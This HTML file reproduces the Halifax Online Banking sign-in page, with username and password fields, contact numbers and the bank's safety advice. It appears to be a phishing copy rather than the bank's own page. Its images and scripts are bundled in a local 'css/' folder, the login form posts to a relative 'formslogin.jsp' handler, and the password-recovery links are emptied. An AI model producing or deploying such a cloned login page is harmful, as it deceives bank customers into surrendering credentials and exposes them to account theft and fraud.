<html><!DOCTYPE html PUBLIC "-//W3C//DTD XHTML 1.0 Transitional//EN" "http://www.w3.org/TR/xhtml1/DTD/xhtml1-transitional.dtd">






<title>Halifax Online</title>




<html xmlns="http://www.w3.org/1999/xhtml" lang="en" xml:lang="en">
<head>



<meta name="keywords" content="" />
<meta name="description" content="" />
<meta http-equiv="Content-Type" content="text/html; charset=utf-8" />	
<meta http-equiv="content-language" content="en-gb" />
<!--[if gte IE 8]><meta http-equiv="X-UA-Compatible" content="IE=IE8" /><![endif]-->
<meta name="robots" content="all,index,follow" />
<meta name="distribution" content="global" />
<meta name="rating" content="general" />
<meta http-equiv="pics-label" content='(pics-1.1 "http://www.icra.org/ratingsv02.html" comment "Single file EN v2.0" l gen true for "http://www.halifax-online.co.uk/personal" r (nz 1 vz 1 lz 1 oz 1 cz 1) "http://www.rsac.org/ratingsv01.html" l gen true for "http://www.halifax-online.co.uk/personal" r (n 0 s 0 v 0 l 0))'>
<link rel="shortcut icon" href="css/favicon.ico" />

<link href="css/global1-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />
<link href="css/global2-min111011.css" media="screen, print" type="text/css" rel="stylesheet" />

<link href="css/print_base-min110729.css" media="print" type="text/css" rel="stylesheet" />
<!--[if IE 8]><link href="css/ie8-min110817.css" type="text/css" rel="stylesheet" /><![endif]-->
<!--[if IE 7]><link href="css/ie7-min111005.css" type="text/css" rel="stylesheet" /><![endif]-->
<!--[if lt IE 7]><link href="/ie7-min111005.css" type="text/css" rel="stylesheet" /><![endif]-->


<script type="text/javascript" src="css/jquery-min110923.js"></script>
<script type="text/javascript" src="css/scriptsnippet.jspf"></script>
<script type="text/javascript" src="css/global-min111005.js"></script>
<script type="text/javascript">DI.themePath="/personal/unauth/assets/HalifaxRetail/";</script>
<script type="text/javascript" src="css/custom-min111005.js"></script>


</head>

<body>



<div id="wrapper">
<div class="outer">
<div id="header">
<ul id="skiplinks">
	<li><a id="lnkSkip" name="lnkSkip" href="#page">Skip to main content</a>
	</li>
</ul>
<div class="clearfix">
<p id="logo"><span> <img
	src="css/personal_loans_halifax-1-1290683246.jpg"
	alt="Halifax" /> </span></p>

<div class="secureMsg">
<p class="msg"><img
	src="css/hfx-sign-in-to-secure-site-1-1314611574.png"
	alt="You&#8217;re signing in to a secure site" /></p>

<p><p><a href="#" title="How can I tell that this site is secure?"  class="newwin">How can I tell that this site is secure?</a></p></p>
</div>
</div>
</div>
</div>
<div class="pageWrap">
<div id="page" class="content">
<div class="primaryWrap">
<div class="primary">
<div class="panel"><h1>Welcome to Online Banking</h1>
<form id="frmLogin" name="frmLogin" method="post"
	action="formslogin.jsp"
	class="validationName:(login) validate:()" autocomplete="off"
	>



<div class="inner"><p><strong>Enter your username and password to sign in.</strong></p>

 
<div class="subPanel">
<fieldset>
<div
	class="formField validate:(required) validationName:(userID) clearfix">
<div class="formFieldInner"><label
	for="frmLogin:strCustomerLogin_userID">Username</label>

<input type="text" autocomplete="off"
	id="frmLogin:strCustomerLogin_userID"
	name="username" class="field setFocus"
	maxlength="30" value='' />

</div>
</div>

<div
	class="formField validate:(required) validationName:(password) clearfix">
<div class="formFieldInner"><label
	for="frmLogin:strCustomerLogin_pwd">Password</label>
<input type="password" id="frmLogin:strCustomerLogin_pwd"
	name="password" class="field" maxlength="20"
	value="" /></div>
</div>

<div class="formField fieldHelp checkbox clearfix">
<div class="formFieldInner"><input id="frmLogin:loginRemember"
	type="checkbox" name="frmLogin:loginRemember"
	 /> <label
	for="frmLogin:loginRemember">Remember my username on this computer</label>
<span class="cxtHelp"> <a class="cxtTrigger"
	title="Click to find out more about remembering your User ID." href="#cxtHelp1">[?]</a>
</span>

</div>

</div>
<div class="inner"><p><strong>Warning:</strong> Don&#8217;t tick this box if you&#8217;re using a public or shared computer.</p></div>
<div class="loginActions clearfix"><input id="frmLogin:btnLogin1"
	name="frmLogin:btnLogin1" type="image" class="submitAction"
	src="css/continue-4-1294218380.png"
	alt="Continue"
	title="Continue" /> 
<ul id="frmLogin:pnlLogin2" class="linkList">
	<li><a id="frmLogin:lkLogin2" name="frmLogin:lkLogin2"
		href=""
		title="Forgotten your password?">Forgotten your password?</a></li>
	<li><a id="frmLogin:lkLogin1" name="frmLogin:lkLogin1"
		href=""
		title="Forgotten your username?">Forgotten your username?</a></li>
	<li><a id="frmLogin:lkLoginTrouble" name="frmLogin:lkLoginTrouble"
		href=""
		title="Having problems signing in?">Having problems signing in?</a></li>

</ul>

</div>
</fieldset>
<input type="hidden" name="frmLogin" value="frmLogin" /> <input
	type="hidden" name="submitToken" value="" /> <input
	type="hidden" name="target"
	value="" />   
 
	</div>



</div>
</form>
</div>


   

<div class="panel">
<div class="salesPromo clearfix">
<p class="Img"><img src="css/isa-investor-top-up-log-on-1-1331644695.jpg"
	alt="&#160;&#160;" /></p>
<div class="Msg">&#160;
&#160;</div>
</div>
</div>


</div>
</div>
<div class="secondary">
<div class="panel">
<div class="subPanel"><h2>Not registered for&#160;Online Banking?</h2>
<p>Online&#160;Banking is a safe and secure way to manage your money online.</p>
<p>You can easily:</p>
<ul>
<li>view accounts and balances</li>
<li>pay bills</li>
<li>apply for products.</li>
</ul>
<ul class="linkList">
<li><a href="http://www.onlinebankingdemo.co.uk/launchhalifax.html?ibdm=10" title="See our Online Banking demo"  class="newwin">See our Online Banking demo</a></li>
<li><a href="https://www.halifax-online.co.uk/personal/a/registration/onlinepersonalregistration.jsp" title="Register for Online Banking" >Register for Online Banking</a></li>
</ul></div>
<div class="accordion">
<div class="part">
<h2 class="trigger">Contact us</h2>
<div class="pane">
<div class="paneInner">
<div class="quickContact"><h3>Bank accounts</h3>
<p>08457 203 040<br />+44 1132 422 229&#160;from outside the UK</p>
<h3>Savings</h3>
<p>08457 263 646<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday 8am-6pm, Sunday 9am-5pm.</p>
<h3>Credit cards</h3>
<p>08457 283 848<br />+44 8457 283 848&#160;from outside the UK</p>
<p>08459 444 555&#160;if your card number begins 525303<br />+44 1733 573 189&#160;from outside the UK</p>
<h3>Mortgages</h3>
<p>08457 27 37 47<br />
Lines are open Monday to Friday 8am&#8211;8pm, Saturday and Sunday 9am-4pm.</p>
<h3>Personal loans</h3>
<p>If your loan agreement begins with 7 call&#160;08457 243 444&#160;(Lines are open Monday to Friday 8am-8pm, Saturday 9am-6pm).<br />
If your loan agreement begins with 84 call&#160;08457 444 455&#160;(Lines are open Monday to Friday 8am-10pm, Saturday 8:30am-6pm, Sunday 9:30am-5.30pm).<br />
If your loan agreement begins with 100 call&#160;08456 047 292&#160;(Lines are open Monday to Sunday 8am-10pm).</p>
<h3>Lost or stolen cards</h3>
<p>08457 203 099<br />+44 1315 498 050&#160;from outside the UK</p>
<h3>Online Banking Helpdesk</h3>
<p>08456 020 000<br />+44 1132 798 302&#160;from outside the UK</p>
<h3>Textphone</h3>
<p>08457 323 436<br />
Lines are open Monday to Friday, 9am - 5.30pm. (For use by customers with hearing impairments only)</p>
<p>We may record your call so we can check we've carried out your instructions correctly and to help us improve our service.</p></div>
</div>
</div>
</div>
<div class="part">
<h2 class="trigger">Help &amp; support</h2>
<div class="pane">
<div class="paneInner"><ul class="quickFAQs">
			
	
	<li><h3 class="qfaqTrigger">What can I do to protect myself online?</h3>
			<div class="qfaqCont">
					<p><p>Adopting a few good habits can help make sure your personal information stays safe and secure on the internet. Find out more about&#160;<a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp" title="online security"  class="newwin">online security</a>.</p>
</p>
				    </div>
			</li>
<li><h3 class="qfaqTrigger">Why am I having trouble logging in? </h3>
			<div class="qfaqCont">
					<p><p>It could be because you're trying to log in from a networked site (the office, for example). If so, please contact your Systems Administrator for help. It could also be because your browser settings are incompatible with the high level of security maintained by Online Banking. Check your browser for compatibility. If you still have trouble, please call our helpdesk on&#160;08456 020 000&#160;(+44 1132 851 888&#160;&#160;from outside the UK).</p>
</p>
				    </div>
			</li>
</ul>

					<p><a href="http://www.halifax.co.uk/onlinebankinghelp/onlinehelp.asp" title="More help &amp; support" target="_blank"  class="linkBullet linkMore newwin newfaqwin">More help & support</a></p></div>
</div>
</div>
</div>
<div class="subPanel"><h2>We&#8217;ve updated our Online Banking&#160;sign in&#160;page</h2>
<p>We've listened to you and made changes to improve your Online Banking experience.</p>
<p>Over the past few months we've advised all our customers by mail and posted notices on our website to tell you in advance about the changes to Online Banking. We hope you've seen these notifications already and had a preview of the new look. There's no change to the information you need to provide.</p>
<p><strong>Stay safe online</strong></p>
<p>To ensure you&#8217;re using the correct website, please don't follow links from search engines but type <a href="http://www.halifax.co.uk/" >www.halifax.co.uk</a> into your address bar instead.</p>
<p>Please remember that we&#8217;ll never direct you to the sign in page from an email and we&#8217;ll never ask for your full memorable information.</p>
<p><a href="http://www.halifax.co.uk/securityandprivacy/security-centre-home/?tag=hpc_p9_ter_link5_r1"  class="linkBullet newwin">More help to stay safe online</a></p></div>
</div>
</div>
</div>
</div>
<div id="footer">
<div class="outer">
<div id="footerInner"><ul><li><a href="http://www.halifax.co.uk/bankaccounts/help-guidance/important-information/" title="Legal"  class="newwin">Legal</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Privacy</a></li><li><a href="http://www.halifax.co.uk/securityandprivacy/securityandprivacy.asp"  class="newwin">Security</a></li><li><a href="http://www.lloydsbankinggroup.com/"  class="newwin">Lloyds Banking Group</a></li><li><a href="http://www.halifax.co.uk/bankaccounts/rates-rewards-fees/" title="Rates &amp; fees"  class="newwin">Rates & fees</a></li></ul></div>
</div>
</div>
</div>


<noscript><div><img alt="DCSIMG" id="DCSIMG" class="hide" src=""/></div></noscript>



<script type="text/javascript">
	LBG.functions.init();

</script>



</body>
</html>
